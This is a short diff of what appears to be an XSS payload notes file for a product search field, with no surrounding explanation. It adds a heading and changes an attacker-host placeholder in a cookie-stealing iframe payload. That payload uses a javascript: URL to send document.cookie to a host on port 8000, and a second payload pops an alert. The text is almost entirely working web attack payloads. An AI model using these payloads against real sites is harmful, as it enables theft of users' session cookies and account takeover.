@@ -1,4 +1,5 @@
+# In Search Product :
 <iframe src="javascript:alert('XSS Attack !')"></iframe>
 
-<iframe src="javascript:document.location='http://<your-ip>:8000?cookie=' + document.cookie"></iframe>
+<iframe src="javascript:document.location='http://127.0.0.0:8000?cookie=' + document.cookie"></iframe>
 
